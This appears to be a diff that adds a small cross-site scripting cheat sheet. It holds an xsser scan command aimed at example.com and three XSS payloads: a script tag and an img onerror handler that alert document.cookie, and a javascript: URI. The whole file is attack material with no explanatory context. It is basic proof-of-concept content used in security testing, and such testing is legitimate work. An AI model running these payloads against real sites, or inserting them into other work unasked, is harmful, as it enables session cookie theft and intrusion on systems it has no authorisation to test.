@@ -1,0 +1,6 @@
+xsser -u https://example.com -c 20 --Cl
+
+"><script>alert(document.cookie)</script>
+"><img src=x onerror=alert(document.cookie)>
+javascript:alert()
+
